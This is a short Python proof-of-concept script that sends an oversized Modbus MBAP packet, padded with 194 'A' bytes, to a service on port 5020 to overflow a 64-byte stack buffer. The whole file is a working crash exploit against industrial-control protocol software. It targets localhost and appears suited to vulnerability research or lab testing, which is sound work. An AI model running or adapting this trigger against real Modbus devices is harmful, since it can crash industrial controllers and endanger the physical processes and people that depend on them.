#!/usr/bin/env python3
"""
PoC: Generic Modbus Buffer Overflow (Port 5020)
Trigger: MBAP length > 57 overflows 64-byte stack buffer
"""

import socket
import struct

s = socket.socket()
s.connect(("localhost", 5020))
s.send(struct.pack(">HHHB", 1, 0, 200, 1) + b"\x03\x00\x00\x00\x01" + b"A" * 194)
s.close()
